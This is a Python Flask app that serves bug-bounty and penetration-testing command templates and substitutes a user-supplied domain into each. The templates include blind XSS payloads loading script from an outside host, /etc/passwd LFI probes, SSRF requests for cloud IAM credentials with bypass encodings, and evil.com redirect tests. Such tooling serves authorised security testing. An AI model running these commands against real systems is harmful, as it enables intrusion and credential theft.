from flask import Flask, render_template, request, jsonify
import re

app = Flask(__name__)

# Domain placeholders to replace
DOMAIN_PLACEHOLDERS = [
    'example.com', 'domain.com', 'target.com', 'tesla.com', 
    'site.com', 'hackerone.com', 'nasa.gov', 'www.nasa.gov', 
    '<DOMAIN>', 'vulnweb.com', 'ens.domains'
]

def normalize_domain(domain):
    """Remove protocol and www prefix, clean domain"""
    domain = domain.strip()
    domain = re.sub(r'^https?://', '', domain)
    domain = re.sub(r'^www\.', '', domain)
    domain = domain.strip('/')
    return domain

def replace_domain_in_command(command, domain):
    """Replace domain placeholders in command while preserving API keys and other placeholders"""
    normalized_domain = normalize_domain(domain)
    
    # Replace all domain placeholders (order matters - longer strings first to avoid partial replacements)
    # Sort by length descending to replace longer placeholders first
    sorted_placeholders = sorted(DOMAIN_PLACEHOLDERS, key=len, reverse=True)
    
    for placeholder in sorted_placeholders:
        # Replace all occurrences of the placeholder
        # This will replace the placeholder everywhere it appears in the command
        command = command.replace(placeholder, normalized_domain)
    
    return command

# Command categories and templates
COMMANDS = [
    {
        'id': 'subdomain_enum',
        'category': 'Subdomain Enumeration',
        'commands': [
            {
                'id': 'subfinder_basic',
                'label': 'Subfinder (Basic)',
                'command': 'subfinder -d example.com -all -recursive -o subfinder.txt'
            },
            {
                'id': 'assetfinder',
                'label': 'Assetfinder',
                'command': 'assetfinder --subs-only example.com > assetfinder.txt'
            },
            {
                'id': 'findomain',
                'label': 'Findomain',
                'command': 'findomain -t target.com | tee findomain.txt'
            },
            {
                'id': 'amass_passive',
                'label': 'Amass (Passive)',
                'command': 'amass enum -passive -d example.com | cut -d\']\' -f 2 | awk \'{print $1}\' | sort -u > amass.txt'
            },
            {
                'id': 'amass_active',
                'label': 'Amass (Active)',
                'command': 'amass enum -active -d example.com | cut -d\']\' -f 2 | awk \'{print $1}\' | sort -u > amass.txt'
            },
            {
                'id': 'crt_sh',
                'label': 'Certificate Transparency (crt.sh)',
                'command': 'curl -s https://crt.sh\\?q\\=\\domain.com\\&output\\=json | jq -r \'.[].name_value\' | grep -Po \'(\\w+\\.\\w+\\.\\w+)$\' > crtsh.txt'
            },
            {
                'id': 'wayback',
                'label': 'Wayback Machine',
                'command': 'curl -s "http://web.archive.org/cdx/search/cdx?url=*.domain.com/*&output=text&fl=original&collapse=urlkey" | sort | sed -e \'s_https*://__\' -e "s/\\/.*//" -e \'s/:.*//\' -e \'s/^www\\.//\' | sort -u > wayback.txt'
            },
            {
                'id': 'virustotal',
                'label': 'VirusTotal Domain Siblings',
                'command': 'curl -s "https://www.virustotal.com/vtapi/v2/domain/report?apikey=[api-key]&domain=www.nasa.gov" | jq -r \'.domain_siblings[]\' > virustotal.txt'
            },
            {
                'id': 'github_subdomains',
                'label': 'GitHub Subdomains',
                'command': 'github-subdomains -d domain.com -t [github_token]'
            },
            {
                'id': 'shosubgo_single',
                'label': 'Shosubgo (Single Domain)',
                'command': 'shosubgo -d target.com -s YourAPIKEY'
            },
            {
                'id': 'shosubgo_file',
                'label': 'Shosubgo (File)',
                'command': 'shosubgo -f domains.txt -s YourAPIKEY'
            },
            {
                'id': 'merge_subdomains',
                'label': 'Merge All Subdomain Files',
                'command': 'cat *.txt | sort -u > final.txt'
            },
            {
                'id': 'subfinder_alterx_dnsx',
                'label': 'Subfinder + AlterX + DNSx',
                'command': 'subfinder -d domain.com | alterx | dnsx'
            },
            {
                'id': 'alterx_enrich',
                'label': 'AlterX Enrich',
                'command': 'echo domain.com | alterx -enrich | dnsx'
            },
            {
                'id': 'alterx_wordlist',
                'label': 'AlterX with Wordlist',
                'command': 'echo domain.com | alterx -pp word=/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt | dnsx'
            },
            {
                'id': 'ffuf_subdomain',
                'label': 'FFuF Subdomain Brute',
                'command': 'ffuf -u "https://FUZZ.target.com" -w wordlist.txt -mc 200,301,302'
            },
            {
                'id': 'asnmap_dnsx',
                'label': 'ASNmap + DNSx',
                'command': 'asnmap -d domain.com | dnsx -silent -resp-only'
            },
            {
                'id': 'amass_intel_org',
                'label': 'Amass Intel (Organization)',
                'command': 'amass intel -org "nasa"'
            },
            {
                'id': 'amass_intel_cidr',
                'label': 'Amass Intel (CIDR)',
                'command': 'amass intel -active -cidr 159.69.129.82/32'
            },
            {
                'id': 'amass_intel_asn',
                'label': 'Amass Intel (ASN)',
                'command': 'amass intel -active -asn [asnno]'
            }
        ]
    },
    {
        'id': 'ip_enum',
        'category': 'IP Enumeration',
        'commands': [
            {
                'id': 'virustotal_ips',
                'label': 'VirusTotal IPs',
                'command': 'curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=<DOMAIN>&apikey=[api-key]" | jq -r \'.. | .ip_address? // empty\' | grep -Eo \'([0-9]{1,3}\\.){3}[0-9]{1,3}\''
            },
            {
                'id': 'alienvault_ips',
                'label': 'AlienVault OTX IPs',
                'command': 'curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/<DOMAIN>/url_list?limit=500&page=1" | jq -r \'.url_list[]?.result?.urlworker?.ip // empty\' | grep -Eo \'([0-9]{1,3}\\.){3}[0-9]{1,3}\''
            },
            {
                'id': 'urlscan_ips',
                'label': 'URLScan.io IPs',
                'command': 'curl -s "https://urlscan.io/api/v1/search/?q=domain:<DOMAIN>&size=10000" | jq -r \'.results[]?.page?.ip // empty\' | grep -Eo \'([0-9]{1,3}\\.){3}[0-9]{1,3}\''
            },
            {
                'id': 'extract_ips',
                'label': 'Extract IPs from File',
                'command': 'grep -oE "\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b"'
            },
            {
                'id': 'shodan_ssl',
                'label': 'Shodan SSL Certificate Search',
                'command': 'shodan search Ssl.cert.subject.CN:"<DOMAIN>" 200 --fields ip_str | httpx-toolkit -sc -title -server -td'
            }
        ]
    },
    {
        'id': 'subdomain_alive',
        'category': 'Subdomain Validation',
        'commands': [
            {
                'id': 'httpx_ports',
                'label': 'HTTPx Port Scan',
                'command': 'cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt'
            },
            {
                'id': 'aquatone_basic',
                'label': 'Aquatone (Basic)',
                'command': 'cat hosts.txt | aquatone'
            },
            {
                'id': 'aquatone_ports',
                'label': 'Aquatone (Custom Ports)',
                'command': 'cat hosts.txt | aquatone -ports 80,443,8000,8080,8443'
            },
            {
                'id': 'aquatone_extended',
                'label': 'Aquatone (Extended Ports)',
                'command': 'cat hosts.txt | aquatone -ports 80,81,443,591,2082,2087,2095,2096,3000,8000,8001,8008,8080,8083,8443,8834,8888'
            }
        ]
    },
    {
        'id': 'url_discovery',
        'category': 'URL Discovery',
        'commands': [
            {
                'id': 'katana',
                'label': 'Katana',
                'command': 'katana -u livesubdomains.txt -d 2 -o urls.txt'
            },
            {
                'id': 'hakrawler',
                'label': 'Hakrawler',
                'command': 'cat urls.txt | hakrawler -u > urls3.txt'
            },
            {
                'id': 'gau',
                'label': 'GAU (Get All URLs)',
                'command': 'cat livesubdomains.txt | gau | sort -u > urls2.txt'
            },
            {
                'id': 'urlfinder',
                'label': 'URLFinder',
                'command': 'urlfinder -d tesla.com | sort -u > urls3.txt'
            },
            {
                'id': 'gau_dedup',
                'label': 'GAU with Deduplication',
                'command': 'echo example.com | gau --mc 200 | urldedupe > urls.txt'
            }
        ]
    },
    {
        'id': 'parameter_extraction',
        'category': 'Parameter Extraction',
        'commands': [
            {
                'id': 'extract_params_php',
                'label': 'Extract Parameters (PHP/ASP/JSP)',
                'command': 'cat urls.txt | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep \'=\' | sort > output.txt'
            },
            {
                'id': 'normalize_params',
                'label': 'Normalize Parameters',
                'command': 'cat output.txt | sed \'s/=.*/=/\' > final.txt'
            },
            {
                'id': 'dedup_params',
                'label': 'Deduplicate Parameters',
                'command': 'cat allurls.txt | grep \'=\' | urldedupe | tee output.txt'
            },
            {
                'id': 'extract_query_params',
                'label': 'Extract Query Parameters',
                'command': 'cat allurls.txt | grep -E \'\\?[^=]+=.+$\' | tee output.txt'
            },
            {
                'id': 'gf_sqli',
                'label': 'GF SQL Injection Patterns',
                'command': 'cat allurls.txt | gf sqli'
            }
        ]
    },
    {
        'id': 'vulnerability_scanning',
        'category': 'Vulnerability Scanning',
        'commands': [
            {
                'id': 'nuclei_single',
                'label': 'Nuclei (Single URL)',
                'command': 'nuclei -u https://target.com -bs 50 -c 30'
            },
            {
                'id': 'nuclei_list',
                'label': 'Nuclei (Domain List)',
                'command': 'nuclei -l live_domains.txt -bs 50 -c 30'
            }
        ]
    },
    {
        'id': 'file_discovery',
        'category': 'File Discovery',
        'commands': [
            {
                'id': 'extract_files_basic',
                'label': 'Extract Files (Basic)',
                'command': 'cat allurls.txt | grep -E "\\.xls|\\.xml|\\.xlsx|\\.json|\\.pdf|\\.sql|\\.doc|\\.docx|\\.pptx|\\.txt|\\.zip|\\.tar\\.gz|\\.tgz|\\.bak|\\.7z|\\.rar|\\.log|\\.cache|\\.secret|\\.db|\\.backup|\\.yml|\\.gz|\\.config|\\.csv|\\.yaml|\\.md|\\.md5"'
            },
            {
                'id': 'extract_files_extended',
                'label': 'Extract Files (Extended)',
                'command': 'cat allurls.txt | grep -E "\\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|tar|xz|7zip|p12|pem|key|crt|csr|sh|pl|py|java|class|jar|war|ear|sqlitedb|sqlite3|dbf|db3|accdb|mdb|sqlcipher|gitignore|env|ini|conf|properties|plist|cfg)$"'
            }
        ]
    },
    {
        'id': 'parameter_fuzzing',
        'category': 'Parameter Fuzzing',
        'commands': [
            {
                'id': 'arjun_passive',
                'label': 'Arjun (Passive Mode)',
                'command': 'arjun -u https://site.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers "User-Agent: Mozilla/5.0"'
            },
            {
                'id': 'arjun_wordlist',
                'label': 'Arjun (With Wordlist)',
                'command': 'arjun -u https://site.com/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10 --headers "User-Agent: Mozilla/5.0"'
            }
        ]
    },
    {
        'id': 'directory_bruteforce',
        'category': 'Directory Bruteforce',
        'commands': [
            {
                'id': 'dirsearch_basic',
                'label': 'Dirsearch (Basic)',
                'command': 'dirsearch -u https://example.com --full-url --deep-recursive -r'
            },
            {
                'id': 'dirsearch_advanced',
                'label': 'Dirsearch (Advanced)',
                'command': 'dirsearch -u https://example.com -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1'
            },
            {
                'id': 'ffuf_advanced',
                'label': 'FFuF (Advanced Directory Brute)',
                'command': 'ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://example.com/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" -H "X-Forwarded-For: 127.0.0.1" -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-Host: localhost" -t 100 -r -o results.json'
            }
        ]
    },
    {
        'id': 'js_recon',
        'category': 'JavaScript Reconnaissance',
        'commands': [
            {
                'id': 'js_hunting',
                'label': 'JS File Hunting with Nuclei',
                'command': 'echo example.com | katana -d 3 | grep -E "\\.js$" | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/ -c 30'
            },
            {
                'id': 'js_secrets',
                'label': 'Extract Secrets from JS Files',
                'command': 'cat jsfiles.txt | grep -r -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret"'
            },
            {
                'id': 'js_api_keys',
                'label': 'Extract API Keys from JS',
                'command': 'cat allurls.txt | grep -E "\\.js$" | httpx-toolkit -mc 200 -content-type | grep -E "application/javascript|text/javascript" | cut -d\' \' -f1 | xargs -I% curl -s % | grep -E "(API_KEY|api_key|apikey|secret|token|password)"'
            },
            {
                'id': 'bulk_js_analysis',
                'label': 'Bulk JS Analysis',
                'command': 'echo domain.com | katana -ps -d 2 | grep -E "\\.js$" | nuclei -t /nuclei-templates/http/exposures/ -c 30'
            },
            {
                'id': 'js_nuclei_bulk',
                'label': 'JS Files Nuclei Scan',
                'command': 'cat alljs.txt | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/'
            }
        ]
    },
    {
        'id': 'content_filtering',
        'category': 'Content Type Filtering',
        'commands': [
            {
                'id': 'html_filter',
                'label': 'HTML Content Filtering',
                'command': 'echo domain | gau | grep -Eo \'(\\/[^\\/]+)\\.(php|asp|aspx|jsp|jsf|cfm|pl|perl|cgi|htm|html)$\' | httpx -status-code -mc 200 -content-type | grep -E \'text/html|application/xhtml+xml\''
            },
            {
                'id': 'js_filter',
                'label': 'JavaScript Content Filtering',
                'command': 'echo domain | gau | grep \'\\.js$\' | httpx -status-code -mc 200 -content-type | grep \'application/javascript\''
            }
        ]
    },
    {
        'id': 'wordpress_recon',
        'category': 'WordPress Reconnaissance',
        'commands': [
            {
                'id': 'wpscan_full',
                'label': 'WPScan Full Enumeration',
                'command': 'wpscan --url https://site.com --disable-tls-checks --api-token <here> -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force'
            }
        ]
    },
    {
        'id': 'port_scanning',
        'category': 'Port Scanning',
        'commands': [
            {
                'id': 'naabu_full',
                'label': 'Naabu Full Scan',
                'command': 'naabu -list ip.txt -c 50 -nmap-cli \'nmap -sV -SC\' -o naabu-full.txt'
            },
            {
                'id': 'nmap_full',
                'label': 'Nmap Full Scan',
                'command': 'nmap -p- --min-rate 1000 -T4 -A target.com -oA fullscan'
            },
            {
                'id': 'masscan',
                'label': 'Masscan Fast Scan',
                'command': 'masscan -p0-65535 target.com --rate 100000 -oG masscan-results.txt'
            }
        ]
    },
    {
        'id': 'sql_injection',
        'category': 'SQL Injection Testing',
        'commands': [
            {
                'id': 'sql_tech_detection',
                'label': 'SQL Technology Detection',
                'command': 'subfinder -dL subdomains.txt -all -silent | httpx-toolkit -td -sc -silent | grep -Ei \'asp|php|jsp|jspx|aspx\''
            },
            {
                'id': 'sql_single_domain',
                'label': 'SQL Tech Detection (Single)',
                'command': 'subfinder -d http://example.com -all -silent | httpx-toolkit -td -sc -silent | grep -Ei \'asp|php|jsp|jspx|aspx\''
            },
            {
                'id': 'sql_endpoints',
                'label': 'SQL Injection Endpoints',
                'command': 'echo http://site.com | gau | uro | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep -E \'\\?[^=]+=.+$\''
            }
        ]
    },
    {
        'id': 'xss_testing',
        'category': 'XSS Testing',
        'commands': [
            {
                'id': 'xss_automated',
                'label': 'XSS Automated Detection',
                'command': 'echo "target.com" | gau | gf xss | uro | httpx -silent | Gxss -p Rxss | dalfox'
            },
            {
                'id': 'xss_checker',
                'label': 'XSS Checker',
                'command': 'echo "example.com" | gau | qsreplace \'<sCript>confirm(1)</sCript>\' | xsschecker -match \'<sCript>confirm(1)</sCript>\' -vuln'
            },
            {
                'id': 'xss_advanced',
                'label': 'XSS Advanced Chain',
                'command': 'echo https://example.com/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt'
            },
            {
                'id': 'xss_final',
                'label': 'XSS Final URLs',
                'command': 'cat xss_output.txt | grep -oP \'^URL: \\K\\S+\' | sed \'s/=.*/=/\' | sort -u > final.txt'
            },
            {
                'id': 'xss_ffuf',
                'label': 'XSS FFUF Request Mode',
                'command': 'ffuf -request xss -request-proto https -w /root/wordlists/xss-payloads.txt -c -mr "<script>alert(\'XSS\')</script>"'
            },
            {
                'id': 'blind_xss',
                'label': 'Blind XSS Testing',
                'command': 'cat urls.txt | grep -E "(login|signup|register|forgot|password|reset)" | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/xss/ -severity critical,high'
            },
            {
                'id': 'blind_xss_header',
                'label': 'Blind XSS (Header)',
                'command': 'subfinder -d example.com | gau | bxss -payload \'"><script src=https://xss.report/c/coffinxp></script>\' -header "X-Forwarded-For"'
            },
            {
                'id': 'blind_xss_params',
                'label': 'Blind XSS (Parameters)',
                'command': 'subfinder -d example.com | gau | grep "&" | bxss -appendMode -payload \'"><script src=https://xss.report/c/coffinxp></script>\' -parameters'
            },
            {
                'id': 'dalfox_blind',
                'label': 'Dalfox Blind XSS',
                'command': 'cat xss_params.txt | dalfox pipe --blind https://your-collaborator-url --waf-bypass --silence'
            }
        ]
    },
    {
        'id': 'lfi_testing',
        'category': 'LFI Testing',
        'commands': [
            {
                'id': 'lfi_nuclei',
                'label': 'LFI Nuclei Scan',
                'command': 'nuclei -l subs.txt -t /root/nuclei-templates/http/vulnerabilities/generic/generic-linux-lfi.yaml -c 30'
            },
            {
                'id': 'lfi_automated',
                'label': 'LFI Automated Discovery',
                'command': 'echo "https://example.com/" | gau | gf lfi | uro | sed \'s/=.*/=/\' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\\*|\\$[^\\:]*):0:0:" -v'
            },
            {
                'id': 'lfi_curl',
                'label': 'LFI Curl Test',
                'command': 'gau target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c \'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"\''
            },
            {
                'id': 'lfi_httpx',
                'label': 'LFI HTTPx Test',
                'command': 'echo \'https://example.com/index.php?page=\' | httpx-toolkit -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr "root:(x|\\*|\\$[^\\:]*):0:0:"'
            },
            {
                'id': 'lfi_ffuf',
                'label': 'LFI FFUF Request Mode',
                'command': 'ffuf -request lfi -request-proto https -w /root/wordlists/offensive\\ payloads/LFI\\ payload.txt -c -mr "root:"'
            }
        ]
    },
    {
        'id': 'cors_testing',
        'category': 'CORS Testing',
        'commands': [
            {
                'id': 'cors_manual',
                'label': 'CORS Manual Test',
                'command': 'curl -H "Origin: http://example.com" -I https://domain.com/wp-json/'
            },
            {
                'id': 'cors_detailed',
                'label': 'CORS Detailed Analysis',
                'command': 'curl -H "Origin: http://example.com" -I https://domain.com/wp-json/ | grep -i -e "access-control-allow-origin" -e "access-control-allow-methods" -e "access-control-allow-credentials"'
            },
            {
                'id': 'cors_nuclei',
                'label': 'CORS Nuclei Scan',
                'command': 'cat example.coms.txt | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/cors/ -o cors_results.txt'
            },
            {
                'id': 'corsy',
                'label': 'Corsy Tool',
                'command': 'python3 corsy.py -i subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\\nCookie: SESSION=Hacked"'
            },
            {
                'id': 'corscanner',
                'label': 'CORScanner',
                'command': 'python3 CORScanner.py -u https://example.com -d -t 10'
            }
        ]
    },
    {
        'id': 'subdomain_takeover',
        'category': 'Subdomain Takeover',
        'commands': [
            {
                'id': 'subzy',
                'label': 'Subzy Takeover Detection',
                'command': 'subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl'
            }
        ]
    },
    {
        'id': 'git_disclosure',
        'category': '.git Folder Disclosure',
        'commands': [
            {
                'id': 'git_leak',
                'label': '.git Folder Leak Detection',
                'command': 'cat domains.txt | grep "SUCCESS" | gf urls | httpx-toolkit -sc -server -cl -path "/.git/" -mc 200 -location -ms "Index of" -probe'
            }
        ]
    },
    {
        'id': 'ssrf_testing',
        'category': 'SSRF Testing',
        'commands': [
            {
                'id': 'ssrf_params',
                'label': 'SSRF Parameter Discovery',
                'command': 'cat urls.txt | grep -E \'url=|uri=|redirect=|next=|data=|path=|dest=|proxy=|file=|img=|out=|continue=\' | sort -u'
            },
            {
                'id': 'ssrf_webhooks',
                'label': 'SSRF Webhook/API Discovery',
                'command': 'cat urls.txt | grep -i \'webhook\\|callback\\|upload\\|fetch\\|import\\|api\' | sort -u'
            },
            {
                'id': 'ssrf_nuclei',
                'label': 'SSRF Nuclei Scan',
                'command': 'cat urls.txt | nuclei -t nuclei-templates/vulnerabilities/ssrf/'
            },
            {
                'id': 'ssrf_localhost',
                'label': 'SSRF Localhost Test',
                'command': 'curl "https://target.com/page?url=http://127.0.0.1:80/"'
            },
            {
                'id': 'ssrf_metadata',
                'label': 'SSRF Cloud Metadata',
                'command': 'curl "https://target.com/api?endpoint=http://169.254.169.254/latest/meta-data/"'
            },
            {
                'id': 'ssrf_metadata_iam',
                'label': 'SSRF IAM Credentials',
                'command': 'curl "https://target.com/api?endpoint=http://169.254.169.254/latest/meta-data/iam/security-credentials/"'
            },
            {
                'id': 'ssrf_bypass_1',
                'label': 'SSRF Bypass (Alternative IP 1)',
                'command': 'curl "https://target.com/page?url=http://127.0.0.1%23.google.com"'
            },
            {
                'id': 'ssrf_bypass_2',
                'label': 'SSRF Bypass (Alternative IP 2)',
                'command': 'curl "https://target.com/page?url=http://127.1"'
            },
            {
                'id': 'ssrf_bypass_3',
                'label': 'SSRF Bypass (IPv6)',
                'command': 'curl "https://target.com/page?url=http://[::1]/"'
            },
            {
                'id': 'ssrf_bypass_4',
                'label': 'SSRF Bypass (Hex)',
                'command': 'curl "https://target.com/page?url=http://0x7f000001"'
            },
            {
                'id': 'ssrf_bypass_5',
                'label': 'SSRF Bypass (Octal)',
                'command': 'curl "https://target.com/page?url=http://017700000001"'
            },
            {
                'id': 'ssrf_callback',
                'label': 'SSRF Callback Test',
                'command': 'curl "https://target.com/page?url=http://yourdomain.burpcollaborator.net"'
            }
        ]
    },
    {
        'id': 'open_redirect',
        'category': 'Open Redirect Testing',
        'commands': [
            {
                'id': 'redirect_params',
                'label': 'Redirect Parameter Discovery',
                'command': 'cat final.txt | grep -Pi "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|login\\?to=|login_url=|logout=|next=|next_page=|out=|g=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_path=|return_to=|return_url=|rurl=|site=|target=|to=|uri=|url=|qurl=|rit_url=|jump=|jump_url=|originUrl=|origin=|Url=|desturl=|u=|Redirect=|location=|ReturnUrl=|redirect_url=|redirect_to=|forward_to=|forward_url=|destination_url=|jump_to=|go_to=|goto_url=|target_url=|redirect_link=" | tee redirect_params.txt'
            },
            {
                'id': 'redirect_gf',
                'label': 'Redirect GF Pattern',
                'command': 'final.txt | gf redirect | uro | sort -u | tee redirect_params.txt'
            },
            {
                'id': 'redirect_test',
                'label': 'Redirect Test',
                'command': 'cat redirect_params.txt | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"'
            },
            {
                'id': 'redirect_chain',
                'label': 'Redirect Full Chain',
                'command': 'subfinder -d vulnweb.com -all | httpx-toolkit -silent | gau | gf redirect | uro | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"'
            },
            {
                'id': 'redirect_payloads',
                'label': 'Redirect with Payloads',
                'command': 'cat redirect_params.txt | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"'
            },
            {
                'id': 'redirect_gau',
                'label': 'Redirect GAU Chain',
                'command': 'echo target.com -all | gau | gf redirect | uro | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"'
            },
            {
                'id': 'redirect_full',
                'label': 'Redirect Full Automation',
                'command': 'subfinder -d target.com -all | httpx-toolkit -silent | gau | gf redirect | uro | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"'
            }
        ]
    },
    {
        'id': 'gf_patterns',
        'category': 'GF Patterns',
        'commands': [
            {
                'id': 'gf_xss',
                'label': 'GF XSS Pattern',
                'command': 'cat allurls.txt | gf xss'
            },
            {
                'id': 'gf_lfi',
                'label': 'GF LFI Pattern',
                'command': 'cat allurls.txt | gf lfi'
            },
            {
                'id': 'gf_redirect',
                'label': 'GF Redirect Pattern',
                'command': 'cat allurls.txt | gf redirect'
            },
            {
                'id': 'gf_ssrf',
                'label': 'GF SSRF Pattern',
                'command': 'cat allurls.txt | gf ssrf'
            },
            {
                'id': 'gf_rce',
                'label': 'GF RCE Pattern',
                'command': 'cat allurls.txt | gf rce'
            },
            {
                'id': 'gf_idor',
                'label': 'GF IDOR Pattern',
                'command': 'cat allurls.txt | gf idor'
            }
        ]
    },
    {
        'id': 'url_processing',
        'category': 'URL Processing',
        'commands': [
            {
                'id': 'uro',
                'label': 'URO (URL Processing)',
                'command': 'cat urls.txt | uro'
            },
            {
                'id': 'qsreplace',
                'label': 'QSReplace (Parameter Replacement)',
                'command': 'cat urls.txt | qsreplace "PAYLOAD"'
            },
            {
                'id': 'urldedupe',
                'label': 'URL Deduplication',
                'command': 'cat urls.txt | urldedupe'
            }
        ]
    },
    {
        'id': 'utilities',
        'category': 'Utilities',
        'commands': [
            {
                'id': 'amass_clean',
                'label': 'Clean Amass Output',
                'command': 'cat domains.txt | cut -d\']\' -f2 | awk \'{print $2}\' | tr \',\' \'\\n\' | sort -u > amass.txt'
            },
            {
                'id': 'ffuf_alternative',
                'label': 'FFuF Alternative Config',
                'command': 'ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://ens.domains/FUZZ -fc 401,403,404 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf -ac -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" -r -t 60 --rate 100 -c'
            }
        ]
    }
]

@app.route('/')
def index():
    """Main page route"""
    return render_template('index.html', commands=COMMANDS)

@app.route('/api-keys')
def api_keys():
    """API Keys configuration page"""
    return render_template('api_keys.html')

@app.route('/api/generate', methods=['POST'])
def generate_commands():
    """API endpoint to generate commands with domain replaced"""
    data = request.get_json()
    domain = data.get('domain', '').strip()
    
    if not domain:
        return jsonify({'error': 'Domain is required'}), 400
    
    # Generate commands with domain replaced
    result = []
    for category in COMMANDS:
        category_data = {
            'id': category['id'],
            'category': category['category'],
            'commands': []
        }
        
        for cmd in category['commands']:
            replaced_command = replace_domain_in_command(cmd['command'], domain)
            category_data['commands'].append({
                'id': cmd['id'],
                'label': cmd['label'],
                'command': replaced_command
            })
        
        result.append(category_data)
    
    return jsonify({'commands': result})

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)

